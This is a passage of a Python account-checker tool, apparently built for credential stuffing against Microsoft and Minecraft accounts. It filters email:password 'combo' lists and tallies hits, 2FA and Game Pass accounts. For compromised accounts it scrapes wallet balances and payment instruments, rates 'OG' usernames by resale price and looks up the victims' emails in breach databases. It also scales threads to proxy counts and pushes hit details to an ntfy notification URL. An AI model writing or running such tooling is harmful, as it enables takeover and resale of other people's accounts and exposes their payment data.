        if d_wins or d_div: parts.append(f'Duels[W:{d_wins} {d_div}]'.strip())
        # Murder Mystery
        mm = games.get('MurderMystery') or games.get('murdermystery') or {}
        mm_wins = mm.get('wins') or 0
        mm_kills= mm.get('kills') or 0
        if mm_wins: parts.append(f'MM[W:{mm_wins} K:{mm_kills}]')
        # SkyBlock
        sb = d.get('skyblock') or {}
        if isinstance(sb, dict) and sb.get('profiles'):
            parts.append(f'SkyBlock[{len(sb["profiles"])}prof]')
        nw_exp = d.get('networkExp') or 0
        if nw_exp: parts.append(f'NwExp:{format_number(int(nw_exp))}')
        return ' | '.join(parts) if parts else None
    except Exception: return None


def fetch_github_by_email(email_addr):
    """GitHub'da email arama - hesap var mı, public repo sayısı."""
    try:
        username = email_addr.split('@')[0] if '@' in email_addr else email_addr
        # GitHub email-based search (anonim)
        r = requests.get(f'https://api.github.com/users/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/vnd.github+json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code == 200:
            d = r.json()
            parts = []
            repos = d.get('public_repos', 0)
            followers = d.get('followers', 0)
            if repos: parts.append(f'Repos:{repos}')
            if followers: parts.append(f'Followers:{followers}')
            company = d.get('company', '')
            if company: parts.append(f'@{company[:20]}')
            return ' | '.join(parts) if parts else 'Registered'
        # Email arama
        r2 = requests.get(f'https://api.github.com/search/users?q={email_addr}+in:email',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/vnd.github+json'},
            timeout=_safe_t(7), verify=False)
        if r2.status_code == 200:
            items = r2.json().get('items', [])
            if items:
                login = items[0].get('login', '')
                return f'@{login}' if login else 'Found'
        return None
    except: return None

# ── MS BALANCE FIX — Geliştirilmiş Token Alma ────────────────────

def fetch_ms_balance_fixed(session):
    """MS bakiye - geliştirilmiş token ve endpoint listesi."""
    try:
        # account.microsoft.com üzerinden direkt scrape
        for url in [
            'https://account.microsoft.com/billing/payments',
            'https://account.microsoft.com/billing',
        ]:
            try:
                r = session.get(url,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                        'Accept': 'text/html,application/xhtml+xml,*/*',
                        'Accept-Language': 'en-US,en;q=0.9',
                    }, timeout=_safe_t(12), allow_redirects=True)
                for pat in [
                    r'"balance"\s*:\s*"?(\d+\.?\d*)"?',
                    r'\$\s*(\d+\.\d{2})\s*USD',
                    r'balance["\s:]+(\d+\.?\d*)',
                    r'walletBalance["\s:]+(\d+\.?\d*)',
                    r'"amount"\s*:\s*(\d+\.?\d+)',
                ]:
                    m = re.search(pat, r.text, re.I)
                    if m:
                        val = float(m.group(1))
                        if val > 0:
                            cur_m = re.search(r'"currency"\s*:\s*"([A-Z]{3})"', r.text)
                            cur   = cur_m.group(1) if cur_m else 'USD'
                            return f'{val:.2f} {cur}'
            except: continue
        # paymentinstruments endpoint ile
        try:
            r3 = session.get(
                'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active',
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'Accept': 'application/json',
                    'Origin': 'https://account.microsoft.com',
                    'Referer': 'https://account.microsoft.com/',
                }, timeout=_safe_t(10))
            if r3.status_code == 200:
                bm = re.search(r'"balance"\s*:\s*(\d+\.?\d*)', r3.text)
                if bm and float(bm.group(1)) > 0:
                    return f'{float(bm.group(1)):.2f} USD'
        except: pass
    except: pass
    return None


# ═══════════════════════════════════════════════════════════════════
# EKSTRA OZELLIKLER BLOGU v3 — API KEY GEREKTIRMEYEN
# ═══════════════════════════════════════════════════════════════════

# ── CAPE / COSMETIC API'LERİ ─────────────────────────────────────

def fetch_cosmetica(uuid):
    """Cosmetica.cc cape ve cosmetics kontrolü."""
    try:
        if not uuid or uuid == 'N/A':
            return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(
            f'https://cosmetica.cc/api/users/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        parts = []
        if d.get('cape') or d.get('hasCape'):
            parts.append('Cape')
        cosmetics = d.get('cosmetics') or []
        if isinstance(cosmetics, list) and cosmetics:
            parts.append(f'Cosmetics:{len(cosmetics)}')
        plus = d.get('plus') or d.get('isPremium') or d.get('premium')
        if plus:
            parts.append('Plus')
        role = d.get('role') or ''
        if role and str(role).lower() not in ('user', '', 'default', 'none'):
            parts.append(f'Role:{role}')
        return ' | '.join(parts) if parts else 'Registered'
    except Exception:
        return None


def fetch_essential_cosmetics(uuid):
    """Essential Mod cosmetics ve profile."""
    try:
        if not uuid or uuid == 'N/A':
            return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(
            f'https://api.essential.gg/v1/profiles/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        parts = []
        if isinstance(d, list) and d:
            d = d[0]
        cosmetics = d.get('cosmetics') or d.get('ownedCosmetics') or []
        if isinstance(cosmetics, (list, dict)):
            cnt = len(cosmetics) if isinstance(cosmetics, list) else len(cosmetics.keys())
            if cnt:
                parts.append(f'Cosmetics:{cnt}')
        plus = d.get('essential_plus') or d.get('isPlus') or d.get('plus')
        if plus:
            parts.append('Essential+')
        return ' | '.join(parts) if parts else 'Registered'
    except Exception:
        return None


def fetch_minecraftcapes(uuid):
    """MinecraftCapes.net cape kontrolü."""
    try:
        if not uuid or uuid == 'N/A':
            return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        for url in [
            f'https://minecraftcapes.net/profile/{fmt}',
            f'https://api.minecraftcapes.net/profile/{fmt}',
        ]:
            try:
                r = requests.get(url,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                    timeout=_safe_t(6), verify=False)
                if r.status_code != 200:
                    continue
                d = r.json()
                if d.get('cape') or d.get('hasCape') or d.get('capeEnabled'):
                    return 'Cape'
                if d.get('ears') or d.get('hasEars'):
                    return 'Ears'
            except Exception:
                continue
        return None
    except Exception:
        return None


def fetch_quasar_cape(uuid):
    """Quasar.cc cape kontrolü."""
    try:
        if not uuid or uuid == 'N/A':
            return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(
            f'https://quasar.cc/api/user/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(6), verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get('cape') or d.get('hasCape') or d.get('premium'):
                return 'Yes'
        return None
    except Exception:
        return None


def fetch_feather_client(username):
    """Feather Client cape ve rank."""
    try:
        for url in [
            f'https://feathermc.com/api/user/{username}',
            f'https://api.feathermc.com/v1/user/{username}',
        ]:
            try:
                r = requests.get(url,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                    timeout=_safe_t(6), verify=False)
                if r.status_code != 200:
                    continue
                d = r.json()
                parts = []
                if d.get('cape') or d.get('hasCape'):
                    parts.append('Cape')
                rank = d.get('rank') or d.get('role') or ''
                if rank and str(rank).lower() not in ('user', 'default', '', 'none'):
                    parts.append(f'Rank:{rank}')
                return ' | '.join(parts) if parts else 'Registered'
            except Exception:
                continue
        return None
    except Exception:
        return None


def fetch_salwyrr(uuid):
    """Salwyrr Client profile."""
    try:
        if not uuid or uuid == 'N/A':
            return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(
            f'https://api.salwyrr.com/launcher/profile/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(6), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('tier') or ''
        if rank and str(rank).lower() not in ('free', 'default', '', 'none'):
            parts.append(f'Tier:{rank}')
        if d.get('cape') or d.get('hasCape'):
            parts.append('Cape')
        return ' | '.join(parts) if parts else 'Registered'
    except Exception:
        return None


# ── SUNUCU API'LERİ (EK) ────────────────────────────────────────

def fetch_zeqa_stats(username):
    """Zeqa Practice PvP ELO ve istatistikler."""
    try:
        for url in [
            f'https://api.zeqa.net/api/user/{username}',
            f'https://zeqa.net/api/player/{username}',
        ]:
            try:
                r = requests.get(url,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                    timeout=_safe_t(7), verify=False)
                if r.status_code != 200:
                    continue
                d = r.json()
                parts = []
                elo = d.get('elo') or d.get('globalElo') or d.get('ranking')
                if elo:
                    parts.append(f'ELO:{elo}')
                wins = d.get('wins') or d.get('totalWins')
                if wins:
                    parts.append(f'Wins:{wins}')
                rank = d.get('rank') or d.get('rankName') or ''
                if rank and str(rank).lower() not in ('default', '', 'none'):
                    parts.append(f'Rank:{rank}')
                return ' | '.join(parts) if parts else None
            except Exception:
                continue
        return None
    except Exception:
        return None


def fetch_jartex_stats(username):
    """JartexNetwork istatistikleri."""
    try:
        r = requests.get(
            f'https://jartexnetwork.com/api/player/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('group') or ''
        if rank and str(rank).lower() not in ('default', 'player', '', 'none'):
            parts.append(f'Rank:{rank}')
        level = d.get('level') or d.get('exp_level')
        if level:
            parts.append(f'Lvl:{level}')
        coins = d.get('coins') or d.get('currency')
        if coins:
            parts.append(f'Coins:{format_number(coins)}')
        return ' | '.join(parts) if parts else None
    except Exception:
        return None


def fetch_galaxite_stats(username):
    """Galaxite Network istatistikleri."""
    try:
        r = requests.get(
            f'https://api.galaxite.net/v1/player/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('tier') or ''
        if rank and str(rank).lower() not in ('default', '', 'none', 'member'):
            parts.append(f'Rank:{rank}')
        xp = d.get('xp') or d.get('experience')
        if xp:
            parts.append(f'XP:{format_number(xp)}')
        return ' | '.join(parts) if parts else None
    except Exception:
        return None


# ── İSİM GEÇMİŞİ & UUID ─────────────────────────────────────────

def fetch_name_history(username):
    """Ashcon API ile geçmiş isimler."""
    try:
        r = requests.get(
            f'https://api.ashcon.app/mojang/v2/user/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            return None
        d = r.json()
        history = d.get('username_history') or []
        if len(history) > 1:
            names = [h.get('username', '') for h in history if h.get('username')]
            if len(names) > 1:
                return ' → '.join(names[-4:])
        return None
    except Exception:
        return None


def fetch_username_rarity(username):
    """İsim uzunluğu ve karakterine göre rarity skoru."""
    try:
        if not username or username == 'N/A':
            return None
        name = str(username).strip()
        score = 0
        label = ''
        # Uzunluk skoru
        if len(name) <= 3:
            score += 100
            label = 'Ultra Rare (≤3)'
        elif len(name) == 4:
            score += 70
            label = 'Very Rare (4)'
        elif len(name) <= 6:
            score += 40
            label = 'Rare (5-6)'
        elif len(name) <= 8:
            score += 15
            label = 'Uncommon (7-8)'
        else:
            score += 0
            label = 'Common'
        # Özel pattern bonusları
        if name.isdigit():
            score += 30
            label += '+NumOnly'
        if re.match(r'^[A-Za-z]+$', name):
            score += 10
            label += '+AlphaOnly'
        if name.lower() == name.upper().lower() and len(name) <= 5:
            score += 20
        if re.match(r'^(.){2,}$', name):
            score += 25
            label += '+Repeat'
        return f'{label} (Score:{score})' if score > 0 else None
    except Exception:
        return None


def check_minecraft_realms(session):
    """Minecraft Realm üyelik kontrolü."""
    try:
        r = session.get(
            'https://pc.realms.minecraft.net/worlds',
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
            },
            timeout=_safe_t(8), verify=False)
        if r.status_code == 200:
            d = r.json()
            worlds = d.get('servers') or d.get('worlds') or []
            if isinstance(worlds, list) and worlds:
                return f'{len(worlds)} Realm(s)'
            return 'Access'
        return None
    except Exception:
        return None


# ── COMBO KALİTE & DOMAIN İSTATİSTİĞİ ───────────────────────────

_domain_stats = {}
_domain_stats_lock = None

def _init_domain_lock():
    global _domain_stats_lock
    import threading as _thr
    if _domain_stats_lock is None:
        _domain_stats_lock = _thr.Lock()

def record_domain_result(email, is_hit):
    """Domain bazlı hit rate takibi."""
    try:
        _init_domain_lock()
        domain = email.split('@')[1].lower() if '@' in email else 'unknown'
        with _domain_stats_lock:
            if domain not in _domain_stats:
                _domain_stats[domain] = {'hits': 0, 'total': 0}
            _domain_stats[domain]['total'] += 1
            if is_hit:
                _domain_stats[domain]['hits'] += 1
    except Exception:
        pass


def get_domain_stats_str(top_n=10):
    """En iyi domain hit oranlarını string olarak döndür."""
    try:
        if not _domain_stats:
            return ''
        rows = []
        for domain, v in _domain_stats.items():
            t = v['total']
            h = v['hits']
            rate = (h / t * 100) if t > 0 else 0
            rows.append((domain, h, t, rate))
        rows.sort(key=lambda x: x[3], reverse=True)
        lines_d = [f'{d}: {h}H/{t}T ({rate:.1f}%)' for d, h, t, rate in rows[:top_n]]
        return '\n'.join(lines_d)
    except Exception:
        return ''


def combo_pre_filter(combo):
    """Combo geçerli mi? Hızlı ön filtre."""
    try:
        if not combo or ':' not in combo:
            return False
        parts = combo.strip().split(':', 1)
        if len(parts) < 2:
            return False
        email, pw = parts[0].strip(), parts[1].strip()
        if not email or not pw:
            return False
        if len(pw) < 1 or len(pw) > 256:
            return False
        if '@' not in email or '.' not in email.split('@')[-1]:
            return False
        if len(email) > 320:
            return False
        return True
    except Exception:
        return False


# ── AUTO BACKUP & JSON EXPORT ────────────────────────────────────

def auto_backup_session(fname):
    """Session sonuçlarını ZIP olarak yedekle."""
    try:
        import zipfile as _zf
        src_dir = os.path.join('results', fname)
        if not os.path.exists(src_dir):
            return None
        zip_path = os.path.join('results', f'{fname}_backup.zip')
        with _zf.ZipFile(zip_path, 'w', _zf.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(src_dir):
                for file in files:
                    fp = os.path.join(root, file)
                    arcname = os.path.relpath(fp, os.path.join('results'))
                    zf.write(fp, arcname)
        return zip_path
    except Exception:
        return None


def export_session_json(fname, stats_dict):
    """Session istatistiklerini JSON olarak dışa aktar."""
    try:
        import json as _json
        out_path = os.path.join('results', fname, 'session_stats.json')
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        data = {
            'session': fname,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'stats': stats_dict,
            'domain_stats': _domain_stats,
            'version': '1.0',
        }
        with open(out_path, 'w', encoding='utf-8') as jf:
            _json.dump(data, jf, indent=2, ensure_ascii=False)
        return out_path
    except Exception:
        return None


# ── NTFY.SH BİLDİRİM ────────────────────────────────────────────

def send_ntfy(title, message, priority='default', tags=None):
    """ntfy.sh ücretsiz push bildirimi."""
    try:
        ntfy_url = config.get('ntfy_url', '')
        if not ntfy_url:
            return False
        headers = {
            'Title': str(title)[:250],
            'Priority': priority,
            'Content-Type': 'text/plain; charset=utf-8',
        }
        if tags:
            headers['Tags'] = ','.join(tags) if isinstance(tags, list) else str(tags)
        r = requests.post(ntfy_url, data=message.encode('utf-8'),
            headers=headers, timeout=_safe_t(8), verify=False)
        return r.status_code in (200, 201)
    except Exception:
        return False


def send_ntfy_hit(cap):
    """Hit'te ntfy bildirimi gönder."""
    try:
        if not config.get('ntfy_notify_hits', False):
            return
        tier = getattr(cap, 'value_tier', 'C')
        score = getattr(cap, 'value_score', 0)
        name = getattr(cap, 'name', '') or ''
        email = getattr(cap, 'email', '') or ''
        title = f'[{tier}-Tier] Hit! Score:{score}'
        body_parts = [f'Email: {email[:40]}']
        if name and name != 'N/A':
            body_parts.append(f'MC: {name}')
        t = getattr(cap, 'type', None)
        if t:
            body_parts.append(f'Type: {t}')
        tags = ['tada'] if tier in ('S', 'A') else ['white_check_mark']
        priority = 'high' if tier in ('S', 'A') else 'default'
        send_ntfy(title, '\n'.join(body_parts), priority=priority, tags=tags)
    except Exception:
        pass


# ── PERFORMANS: THREAD AUTO-TUNE ────────────────────────────────

def auto_tune_threads():
    """CPU sayısına ve combo boyutuna göre optimal thread sayısı."""
    try:
        import multiprocessing as _mp
        cpu_count = _mp.cpu_count()
        combo_count = len(Combos) if 'Combos' in globals() else 500
        proxy_count = len(proxylist) if 'proxylist' in globals() else 0
        # Proxy varsa daha fazla thread kullan
        if proxy_count > 200:
            suggested = min(cpu_count * 20, 500, combo_count)
        elif proxy_count > 50:
            suggested = min(cpu_count * 15, 300, combo_count)
        elif proxy_count > 0:
            suggested = min(cpu_count * 10, 150, combo_count)
        else:
            suggested = min(cpu_count * 6, 100, combo_count)
        return max(suggested, 10)
    except Exception:
        return 50


# ── PERFORMANS: OPTİMİZE SESSION ────────────────────────────────

def create_fast_session():
    """Keep-Alive, brotli ve connection pool ile optimize session."""
    try:
        session = requests.Session()
        session.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=20,
            pool_maxsize=50,
            max_retries=0,
        )
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        })
        return session
    except Exception:
        return requests.Session()


# ── BREACH CHECK (üçüncü taraf, key yok) ────────────────────────

def check_breach_count(email):
    """DeHashed tarzı üçüncü taraf breach taraması (key gerektirmeyen)."""
    try:
        r = requests.get(
            f'https://leakcheck.io/api/public?check={email}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(6), verify=False)
        if r.status_code == 200:
            d = r.json()
            found = d.get('found') or d.get('result') or 0
            if found and int(str(found).replace('+', '')) > 0:
                return f'{found} breach(es)'
        # Fallback: informal scrape
        r2 = requests.get(
            f'https://haveibeenpwned.com/account/{email}',
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'application/json',
            },
            timeout=_safe_t(6), verify=False)
        if r2.status_code == 200:
            try:
                breaches = r2.json()
                if isinstance(breaches, list) and breaches:
                    names = [b.get('Name', '') for b in breaches[:3] if b.get('Name')]
                    return f'{len(breaches)} breaches: {", ".join(names)}'
            except Exception:
                pass
        return None
    except Exception:
        return None


# ── OG NAME GELİŞTİRME ──────────────────────────────────────────

def check_short_name_value(username):
    """Kısa isim değer kontrolü — pazar fiyatı tahmini."""
    try:
        if not username or username == 'N/A':
            return None
        n = str(username).strip()
        length = len(n)
        if length > 8:
            return None
        price_map = {
            1: '$500+',
            2: '$200-500',
            3: '$50-200',
            4: '$20-80',
            5: '$10-30',
            6: '$5-15',
            7: '$2-8',
            8: '$1-5',
        }
        base = price_map.get(length, '')
        extras = []
        if n.isdigit():
            extras.append('NumOnly+')
        if re.match(r'^[a-zA-Z]+$', n):
            extras.append('AlphaOnly+')
        if n.lower() in ('god', 'pro', 'king', 'ace', 'top', 'max', 'win',
                          'pvp', 'mc', 'op', 'vip', 'xd', 'bot', '404',
                          'null', 'void', 'zero', 'one'):
            extras.append('PopularWord++')
        suffix = ' ' + ' '.join(extras) if extras else ''
        return f'{base}{suffix}'
    except Exception:
        return None

def validate_hex_color(color_str):
    if not color_str:
        return None
    color_str = str(color_str).strip()
    if color_str.startswith('#'):
        hex_part = color_str[1:]
        if len(hex_part) == 6 and all((c in '0123456789ABCDEFabcdef' for c in hex_part)):
            try:
                return int(hex_part, 16)
            except ValueError:
                return None
    else:
        try:
            decimal_val = int(color_str)
            if 0 <= decimal_val <= 16777215:
                return decimal_val
        except ValueError:
            pass
        if len(color_str) == 6 and all((c in '0123456789ABCDEFabcdef' for c in color_str)):
            try:
                return int(color_str, 16)
            except ValueError:
                pass
    return None
from urllib.parse import urlparse, parse_qs
from io import StringIO
UI_ENABLED = True
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
    from minecraft.exceptions import LoginDisconnect, YggdrasilError
    import minecraft.authentication
    minecraft.authentication.HEADERS = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Connection': 'close'
    }
    MINECRAFT_AVAILABLE = True
    import threading
    import sys as _sys
    _original_excepthook = threading.excepthook if hasattr(threading, 'excepthook') else None
    def _silent_excepthook(args):
        if args.exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            return
        if 'minecraft.networking' in str(args.exc_traceback) or 'minecraft.exceptions' in str(args.exc_traceback):
            return
        if _original_excepthook:
            _original_excepthook(args)
    if hasattr(threading, 'excepthook'):
        threading.excepthook = _silent_excepthook
    _original_sys_excepthook = _sys.excepthook
    def _silent_sys_excepthook(exc_type, exc_value, exc_traceback):
        if exc_type in (EOFError, ConnectionError, OSError, BrokenPipeError, TimeoutError, LoginDisconnect):
            if exc_traceback and ('minecraft' in str(exc_traceback.tb_frame) or 'minecraft' in str(exc_value)):
                return
        _original_sys_excepthook(exc_type, exc_value, exc_traceback)
    _sys.excepthook = _silent_sys_excepthook
except ImportError:
    MINECRAFT_AVAILABLE = False
    print(f'{Fore.YELLOW}Warning: pyCraft not available. Hypixel ban checking disabled.{Fore.RESET}')
ANSI_ESCAPE = re.compile('\\x1B(?:[@-Z\\\\-_]|\\[[0-?]*[ -/]*[@-~])')
HYPIXEL_NAME = re.compile(r'(?<=content="Plancke" /><meta property="og:locale" content="en_US" /><meta property="og:description" content=").+?(?=")', re.S)
HYPIXEL_TITLE = re.compile(r'<title>(.+?)\s*\|\s*Plancke</title>', re.IGNORECASE)
HYPIXEL_LEVEL = re.compile(r'(?<=Level:</b> ).+?(?=<br/><b>)')
FIRST_LOGIN = re.compile(r'(?<=<b>First login: </b>).+?(?=<br/><b>)')
LAST_LOGIN = re.compile(r'(?<=<b>Last login: </b>).+?(?=<br/>)')
BW_STARS = re.compile(r'(?<=<li><b>Level:</b> ).+?(?=</li>)')
SB_NETWORTH = re.compile(r'(?<= Networth: ).+?(?=\\n)')

class _UIStdoutCapture:
    """print() çağrılarını yakalar, UI log'a yönlendirir."""
    def __init__(self, ui_ref, real_stdout):
        self._ui  = ui_ref
        self._real = real_stdout
        self._buf  = ''
    def write(self, s):
        if not s or s == '\n': return
        stripped = s.strip()
        if stripped:
            try:
                self._ui.add_log(stripped[:120], 'INFO')
            except Exception:
                pass
    def flush(self): pass
    def fileno(self):
        return self._real.fileno()

class UIManager:
    def __init__(self):
        self.width = 120
        self.height = 30
        self.logs = []
        self.max_logs = 100
        self.log_initialized = False
        self.cui_initialized = False
        self.cui_grid_lines = 0
        self.log_area_limit = 300
        self.log_area_count = 0
        self._cached_stats = {}
        self._cached_colors = None
        self._cached_ascii_logo = None
        self._stdout_lock = __import__('threading').Lock()
        self._prev_line_count = 0
        self._real_stdout = __import__('sys').stdout  # intercept öncesi gerçek stdout
        # Windows ANSI VT modu etkinleştir
        try:
            if __import__('os').name == 'nt':
                import ctypes
                k32 = ctypes.windll.kernel32
                k32.SetConsoleMode(k32.GetStdHandle(-11), 7)
        except Exception:
            pass
        # Başlangıçta terminal temizle
        __import__('sys').stdout.write('\x1b[2J\x1b[H')
        __import__('sys').stdout.flush()
        self.stats = {'hits': 0, 'bad': 0, 'twofa': 0, 'valid_mail': 0, 'xgp': 0, 'xgpu': 0, 'other': 0, 'mfa': 0, 'sfa': 0, 'checked': 0, 'total': 0, 'cpm': 0, 'retries': 0, 'errors': 0, 'minecraft_capes': 0, 'optifine_capes': 0, 'inbox_matches': 0, 'name_changes': 0, 'payment_methods': 0, 'banned': 0, 'unbanned': 0, 'tier_s': 0, 'tier_a': 0, 'tier_b': 0, 'tier_c': 0, 'og_names': 0, 'lost': 0, 'cubecraft': 0, 'lunar': 0, 'hypixel': 0, 'zeqa': 0, 'bedrock': 0, 'capes_total': 0, 'essential': 0, 'breach': 0, 'realms': 0, 'rare_names': 0, 'minemen': 0, 'hive': 0, 'wynncraft': 0}
        self.start_time = None
        self._lock = threading.Lock()
        self._hit_timestamps = []
        self._last_progress_print = 0

    def og_alert(self, name, og_type):
        try:
            with self._lock:
                print(f'{Fore.YELLOW}{"*" * 56}{Fore.RESET}')
                print(f'{Fore.YELLOW}  ★  OG NAME FOUND: {name}  [{og_type}]  ★{Fore.RESET}')
                print(f'{Fore.YELLOW}{"*" * 56}{Fore.RESET}')
        except: pass

    def print_progress_bar(self, checked, total, hits):
        try:
            now = time.time()
            if now - self._last_progress_print < 0.4: return
            self._last_progress_print = now
            pct = checked / max(total, 1)
            filled = int(30 * pct)
            bar = (f'{Fore.GREEN}' + '█' * filled +
                   f'{Fore.WHITE}' + '░' * (30 - filled) + f'{Fore.RESET}')
            elapsed = int(now - self.start_time) if self.start_time else 0
            h2, m2, s2 = elapsed//3600, (elapsed%3600)//60, elapsed%60
            _eta = calc_eta(checked, total, self.start_time) if hasattr(self,'start_time') else '?'
            sys.stdout.write(
                f'\r {bar} {Fore.CYAN}{pct*100:5.1f}%{Fore.RESET} '
                f'[{checked}/{total}] '
                f'{Fore.GREEN}Hits:{hits}{Fore.RESET} '
                f'{Fore.WHITE}{h2:02d}:{m2:02d}:{s2:02d}{Fore.RESET} '
                f'{Fore.YELLOW}ETA:{_eta}{Fore.RESET}  ')
            sys.stdout.flush()
        except: pass

    def print_live_stats_table(self):
        try:
            s = self.stats
            with self._lock:
                print(f'\n{Fore.CYAN}╔══════════════════════════════════════╗{Fore.RESET}')
                print(f'{Fore.CYAN}║{Fore.RESET}  '
                      f'{Fore.YELLOW}💎 S:{s["tier_s"]:4d}{Fore.RESET}  '
                      f'{Fore.RED}🔥 A:{s["tier_a"]:4d}{Fore.RESET}  '
                      f'{Fore.CYAN}⚡ B:{s["tier_b"]:4d}{Fore.RESET}  '
                      f'{Fore.WHITE}· C:{s["tier_c"]:4d}{Fore.RESET}  '
                      f'{Fore.CYAN}║{Fore.RESET}')
                print(f'{Fore.CYAN}║{Fore.RESET}  '
                      f'{Fore.MAGENTA}OG:{s["og_names"]:3d}{Fore.RESET}  '
                      f'{Fore.GREEN}XGPU:{s["xgpu"]:3d}{Fore.RESET}  '
                      f'{Fore.BLUE}Lunar:{s["lunar"]:2d}{Fore.RESET}  '
                      f'{Fore.YELLOW}CC:{s["cubecraft"]:2d}{Fore.RESET}   '
                      f'{Fore.CYAN}║{Fore.RESET}')
                print(f'{Fore.CYAN}╚══════════════════════════════════════╝{Fore.RESET}')
        except: pass

    def record_hit_time(self):
        now = time.time()
        self._hit_timestamps.append(now)
        cutoff = now - 300
        self._hit_timestamps = [t for t in self._hit_timestamps if t >= cutoff]

    def print_hit_rate_graph(self):
        try:
            now = time.time()
            buckets = [0] * 6
            for ts in self._hit_timestamps:
                age = now - ts
                if age < 30:
                    buckets[5 - min(int(age / 5), 5)] += 1
            max_b = max(buckets) if any(buckets) else 1
            height = 4
            graph_lines = []
            for row in range(height, 0, -1):
                line = f'{Fore.CYAN}|{Fore.RESET}'
                for b in buckets:
                    line += (f'{Fore.GREEN}▓▓{Fore.RESET}'
                             if b * height // max(max_b, 1) >= row else '  ')
                graph_lines.append(line)
            with self._lock:
                print(f'\n{Fore.WHITE}  Hit Rate/30s:{Fore.RESET}')
                for gl in graph_lines: print(f'  {gl}')
                print(f'  {Fore.CYAN}\u2570{"-"*12}\u256f {Fore.WHITE}now →{Fore.RESET}')
        except: pass

    def log_hit_colored_tier(self, capture_line, tier):
        colors = {'S': Fore.YELLOW, 'A': Fore.RED, 'B': Fore.CYAN, 'C': Fore.WHITE}
        c = colors.get(str(tier).upper(), Fore.WHITE)
        try:
            with self._lock:
                print(f'{c}{capture_line}{Fore.RESET}')
        except: pass

    def reset_log_area(self):
        self.log_start_line = max(15, self.height - 10)
        print(f'\x1b[{self.log_start_line};0H', end='')
        self.clear_from_cursor()
        self.log_area_count = 0
    def clear_screen(self):
        _out = getattr(self, '_real_stdout', sys.stdout)
        with self._stdout_lock:
            _out.write('\x1b[2J\x1b[H')
            _out.flush()
    def move_cursor_home(self):
        print('\x1b[H', end='')
    def clear_from_cursor(self):
        print('\x1b[J', end='')
    def show_ui_screen(self):
        try:
            now = time.time()
            if hasattr(self, '_last_ui_draw') and now - self._last_ui_draw < 0.35:
                return
            self._last_ui_draw = now

            s     = self.stats
            chk   = s.get('checked', 0);    total = s.get('total', 1)
            _hits = s.get('hits', 0);        _bad  = s.get('bad', 0)
            _2fa  = s.get('twofa', 0);       _xgp  = s.get('xgp', 0)
            _xgpu = s.get('xgpu', 0);        _vm   = s.get('valid_mail', 0)
            _oth  = s.get('other', 0);       _ret  = s.get('retries', 0)
